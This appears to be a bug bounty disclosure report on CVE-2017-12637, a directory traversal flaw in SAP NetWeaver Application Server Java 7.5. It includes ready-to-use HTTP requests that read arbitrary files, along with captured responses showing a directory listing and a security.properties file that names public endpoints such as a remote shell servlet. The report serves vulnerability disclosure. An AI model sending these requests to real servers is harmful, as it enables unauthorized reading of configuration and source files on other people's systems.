

# Directory traversal in SAP NetWeaver

## Summary

Directory traversal vulnerability in scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS in SAP NetWeaver Application Server Java 7.5 allows remote attackers to read arbitrary files via a ``..`` in the query string,.


## Steps To Reproduce

Use the following requests in BURP Repeater 

Read `..` folder
```
GET /scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/../ HTTP/1.1
Host: $DOMAIN
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```
**Response**
```
HTTP/1.1 200 OK
Date: Sun, 16 May 2021 02:19:39 GMT
Server: Apache
TRUNCATED

api-link
black
help
META-INF
ui
version.txt
WEB-INF

```

Read file WEB-INF/security.properties

**Request** 
```
GET /scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/../WEB-INF/security.properties HTTP/1.1
Host: $DOMAIN
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```
**Response**
```
HTTP/1.1 200 OK
Date: Sun, 16 May 2021 02:24:02 GMT
Server: Apache
etag: ffffffffbe8e19df-gzip
expires: Mon, 17 May 2021 02:24:02
last-modified: Sat, 15 May 2021 02:24:02
content-type: text/javascript
Content-Length: 3114
strict-transport-security: max-age=31536000; includeSubDomains
TRUNCATED 

# Authentication declarations
#
# path.<name>=<uri>
# auth.<name>=<authentication-required>
#
# Longest match always wins, order is not important

# By default everything requires a username
path.root=/*
auth.root=user

# Except the login page, which is public
path.ui.login=/ui/login/*
auth.ui.login=public

# The soap JSPs are public
path.ui.soap=/ui/soap/*
auth.ui.soap=public

path.ui.jee.login=/j_security_check
auth.ui.jee.login=public

TRUNCATED

# The remote shell servlet does its own authentication
path.shell=/api-shell
auth.shell=public

# The iPhone servlets do their own authentication
path.iphone=/api-iphone
auth.iphone=public
path.iphone.jobfile=/api-iphone/jobfile
auth.iphone.jobfile=public

# The APNS servlet does its own authentication
path.apns=/api-apns
auth.apns=public

# The remote shell servlet does its own authentication
path.apiremote=/api-remote
auth.apiremote=public

# The SOAP Request servlet does its own authentication
path.soap=/api-soap
auth.soap=public

# The file get servlet does its own authentication
path.jgetfile=/api-jgetfile
auth.jgetfile=public

# Allow the version.txt file to be retrieved without requiring a logon.
path.version=/version.txt
auth.version=public

# The tab api does its own authentication
path.api.tab=/api-tab
auth.api.tab=public

# The publish api does its own authentication
path.api.publish=/api-publish
auth.api.publish=public

# Allow public access to j_security_check - which websphere passes through our security filter
path.j_security_check=/j_security_check
auth.j_security_check=public

# Allow public access to sap_j_security_check - for netweaver installations, this is required when users must change password when expired
path.sap_j_security_check=/sap_j_security_check
auth.sap_j_security_check=public

# Allow public access to /ChangePassword - for netweaver installations, this is required when users must change password when expired (container redirects to this url).
path.sap_change_password=/ChangePassword
auth.sap_change_password=public

# Allow public access to R2W interfac - does its own authentication
path.ipi.r2w=/ipi-r2w
auth.ipi.r2w=public

# Allow public access to the JavaDoc (APIDOCS)
path.help.apidocs=/help/apidocs/*
auth.help.apidocs=public

responseprefix=/auth/
respond.httpresponsecode=httpresponsecode

```


## Impact
An attacker could read local files on the web server that they would normally not have access to, such as the application source code or configuration files containing sensitive information on how the website is configured.


### Supporting Material/References:
* https://www.cvedetails.com/cve/CVE-2017-12637/
* https://nvd.nist.gov/vuln/detail/CVE-2017-12637



